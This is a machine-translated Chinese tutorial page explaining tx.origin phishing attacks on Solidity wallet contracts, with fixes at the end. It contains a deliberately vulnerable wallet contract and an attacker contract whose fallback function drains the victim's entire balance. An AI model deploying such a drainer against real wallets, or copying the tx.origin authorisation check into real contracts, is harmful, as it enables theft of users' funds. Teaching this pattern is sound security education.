<html>
<head>
<title>Solidity: Tx Origin Attacks</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">坚固性:Tx起源攻击</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514?source=collection_archive---------0-----------------------#2018-04-01">https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514?source=collection_archive---------0-----------------------#2018-04-01</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><div class=""/><figure class="fi fk ir is it iu fe ff paragraph-image"><div role="button" tabindex="0" class="iv iw di ix bf iy"><div class="fe ff iq"><img src="../Images/2484ceba11442ee9fe4676deac8085ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iKzKSGwUxvbJe_kE2o7VIg.jpeg"/></div></div></figure><p id="5ed6" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated">交易源攻击是一种网络钓鱼攻击，可以耗尽合同中的所有资金。</p></div><div class="ab cl jz ka hb kb" role="separator"><span class="kc bw bk kd ke kf"/><span class="kc bw bk kd ke kf"/><span class="kc bw bk kd ke"/></div><div class="hm hn ho hp hq"><h2 id="e671" class="kg kh ht bd ki kj kk kl km kn ko kp kq jm kr ks kt jq ku kv kw ju kx ky kz la dt translated">故障点</h2><ul class=""><li id="8384" class="lb lc ht jd b je ld ji le jm lf jq lg ju lh jy li lj lk ll dt translated">使用<strong class="jd hu"><em class="lm">address . call . value(amount)(</em></strong><em class="lm"/>来转移以太</li><li id="c926" class="lb lc ht jd b je ln ji lo jm lp jq lq ju lr jy li lj lk ll dt translated">使用<strong class="jd hu"> <em class="lm"> tx.origin </em> </strong>检查合同所有者的身份</li></ul><figure class="lt lu lv lw fq iu fe ff paragraph-image"><div class="fe ff ls"><img src="../Images/f288713f25c2f1e7f01f3e3825898731.png" data-original-src="https://miro.medium.com/v2/resize:fit:518/format:webp/1*Jqv9ZrK8jV0HWC8NwsWQhw.jpeg"/></div></figure></div><div class="ab cl jz ka hb kb" role="separator"><span class="kc bw bk kd ke kf"/><span class="kc bw bk kd ke kf"/><span class="kc bw bk kd ke"/></div><div class="hm hn ho hp hq"><h2 id="946b" class="kg kh ht bd ki kj kk kl km kn ko kp kq jm kr ks kt jq ku kv kw ju kx ky kz la dt translated">契约</h2><p id="489e" class="pw-post-body-paragraph jb jc ht jd b je ld jg jh ji le jk jl jm lx jo jp jq ly js jt ju lz jw jx jy hm dt translated">TxOriginVictim是一个智能合约，是一个钱包类型的合约。</p><pre class="lt lu lv lw fq ma mb mc md aw me dt"><span id="406a" class="kg kh ht mb b fv mf mg l mh mi">pragma solidity ^0.4.18;<br/></span><span id="0e96" class="kg kh ht mb b fv mj mg l mh mi">contract TxOriginVictim {</span><span id="8089" class="kg kh ht mb b fv mj mg l mh mi">address owner;<br/></span><span id="a3c7" class="kg kh ht mb b fv mj mg l mh mi">function TxOriginVictim() {</span><span id="d124" class="kg kh ht mb b fv mj mg l mh mi">  owner = msg.sender;</span><span id="6a77" class="kg kh ht mb b fv mj mg l mh mi">}</span><span id="505a" class="kg kh ht mb b fv mj mg l mh mi">function transferTo(address to, uint amount) public {</span><span id="166f" class="kg kh ht mb b fv mj mg l mh mi">  require(tx.origin == owner);</span><span id="338f" class="kg kh ht mb b fv mj mg l mh mi">  to.call.value(amount)();</span><span id="14b5" class="kg kh ht mb b fv mj mg l mh mi">}</span><span id="654b" class="kg kh ht mb b fv mj mg l mh mi">function() payable public {}</span></pre><p id="aa61" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated">TxOriginAttack是一个将被攻击者使用的契约。</p><pre class="lt lu lv lw fq ma mb mc md aw me dt"><span id="7aa9" class="kg kh ht mb b fv mf mg l mh mi">pragma solidity ^0.4.18;<br/></span><span id="f14a" class="kg kh ht mb b fv mj mg l mh mi">interface TxOriginVictim {</span><span id="c3ed" class="kg kh ht mb b fv mj mg l mh mi">  function transferTo(address to, uint amount);</span><span id="e1e2" class="kg kh ht mb b fv mj mg l mh mi">}</span><span id="c9b9" class="kg kh ht mb b fv mj mg l mh mi">contract TxOriginAttacker {</span><span id="d0dd" class="kg kh ht mb b fv mj mg l mh mi">address owner;<br/></span><span id="4fdf" class="kg kh ht mb b fv mj mg l mh mi">function TxOriginAttacker() public {</span><span id="b8ae" class="kg kh ht mb b fv mj mg l mh mi">  owner = msg.sender;</span><span id="54cf" class="kg kh ht mb b fv mj mg l mh mi">}</span><span id="a1a0" class="kg kh ht mb b fv mj mg l mh mi">function getOwner() public returns (address) {</span><span id="2b4b" class="kg kh ht mb b fv mj mg l mh mi">  return owner;</span><span id="7499" class="kg kh ht mb b fv mj mg l mh mi">}</span><span id="7822" class="kg kh ht mb b fv mj mg l mh mi">function() payable public {</span><span id="c293" class="kg kh ht mb b fv mj mg l mh mi">  TxOriginVictim(msg.sender).transferTo(owner, msg.sender.balance);</span><span id="b6b3" class="kg kh ht mb b fv mj mg l mh mi">}</span><span id="adfd" class="kg kh ht mb b fv mj mg l mh mi">}</span></pre><ol class=""><li id="c382" class="lb lc ht jd b je jf ji jj jm mk jq ml ju mm jy mn lj lk ll dt translated">用户将以太网从其智能合约钱包转移到TxOriginAttacker的地址</li><li id="a943" class="lb lc ht jd b je ln ji lo jm lp jq lq ju lr jy mn lj lk ll dt translated">Ether命中TxOriginAttacker契约，调用fallback函数，触发:<code class="eh mo mp mq mb b">TxOriginVictim(msg.sender).transferTo(owner, msg.sender.balance)</code></li></ol><p id="4502" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated">3.回退函数中的命令将"<strong class="jd hu"> <em class="lm"> pose </em> </strong>"作为TxOriginVictim使用它的地址，<strong class="jd hu"> <em class="lm"> msg.sender </em> </strong>将所有资金(<strong class="jd hu"><em class="lm">msg . sender . balance</em></strong><em class="lm">)</em>转移到TxOriginAttacker合同的<strong class="jd hu"> <em class="lm">所有者</em> </strong></p><p id="1014" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated">4.这是因为在TxOriginVictim契约中，我们检查的是<strong class="jd hu"><em class="lm">tx . origin</em></strong><strong class="jd hu">而不是</strong><strong class="jd hu"><em class="lm">msg . sender</em></strong></p><p id="90ad" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated">5.<strong class="jd hu"> tx.origin </strong>是交易的原始发送方，<strong class="jd hu"> msg.sender </strong>是即时发送方</p><p id="b28d" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated">6.由于攻击者已经使用TxOriginVictim的地址中继了交易，所以他们可以调用<strong class="jd hu"> <em class="lm"> transferTo() </em> </strong>函数"<strong class="jd hu"> <em class="lm">冒充</em> </strong>"作为TxOriginVictim契约，并传递<strong class="jd hu"> msg.sender.balance </strong>(发送者的全部余额)作为金额参数</p><p id="c5d6" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated">7.钱包(TxOriginVictim)检查交易的来源，而不是直接发送者，现在TxOriginVictim将转移其合同中的所有资金</p></div><div class="ab cl jz ka hb kb" role="separator"><span class="kc bw bk kd ke kf"/><span class="kc bw bk kd ke kf"/><span class="kc bw bk kd ke"/></div><div class="hm hn ho hp hq"><h2 id="561d" class="kg kh ht bd ki kj kk kl km kn ko kp kq jm kr ks kt jq ku kv kw ju kx ky kz la dt translated">解决方法</h2><ul class=""><li id="e09c" class="lb lc ht jd b je ld ji le jm lf jq lg ju lh jy li lj lk ll dt translated">切勿使用<strong class="jd hu"> tx.origin </strong>检查所有权授权，而应使用<strong class="jd hu"> msg.sender </strong></li><li id="03db" class="lb lc ht jd b je ln ji lo jm lp jq lq ju lr jy li lj lk ll dt translated">不要用<strong class="jd hu">address . call . value(amount)()</strong>；而是使用<strong class="jd hu"> address.transfer() </strong></li><li id="6a28" class="lb lc ht jd b je ln ji lo jm lp jq lq ju lr jy li lj lk ll dt translated">address.transfer() 将有2300的气体津贴——这意味着可能的攻击契约将没有足够的气体用于除了发射事件之外的进一步计算</li><li id="8538" class="lb lc ht jd b je ln ji lo jm lp jq lq ju lr jy li lj lk ll dt translated"><strong class="jd hu"> address.transfer() </strong>同样抛出失败</li></ul><blockquote class="mr"><p id="6fc7" class="ms mt ht bd mu mv mw mx my mz na jy ek translated"><a class="ae nb" href="https://coincodecap.com/?utm_source=coinmonks" rel="noopener ugc nofollow" target="_blank">在您的收件箱中直接获得最佳软件交易</a></p></blockquote><figure class="nd ne nf ng nh iu fe ff paragraph-image"><a href="https://coincodecap.com/?utm_source=coinmonks"><div class="fe ff nc"><img src="../Images/7c0b3dfdcbfea594cc0ae7d4f9bf6fcb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/0*OJ-qb5G6i863msBB.png"/></div></a></figure><figure class="lt lu lv lw fq iu fe ff paragraph-image"><div class="fe ff ni"><img src="../Images/9665cc840d4eed9e4a69caeccdfe4c29.png" data-original-src="https://miro.medium.com/v2/resize:fit:592/format:webp/1*nLVQru5QXoVkAmN8MeBdCg.jpeg"/></div></figure><h1 id="8088" class="nj kh ht bd ki nk nl nm km nn no np kq nq nr ns kt nt nu nv kw nw nx ny kz nz dt translated">❤️喜欢，分享，留下你的评论</h1><p id="f8fe" class="pw-post-body-paragraph jb jc ht jd b je ld jg jh ji le jk jl jm lx jo jp jq ly js jt ju lz jw jx jy hm dt translated">如果你喜欢这篇文章，不要忘记喜欢，与你的朋友和同事分享，并在下面留下你对这篇文章的评论。跟我来……</p><figure class="lt lu lv lw fq iu"><div class="bz el l di"><div class="oa ob l"/></div></figure></div></div>    
</body>
</html>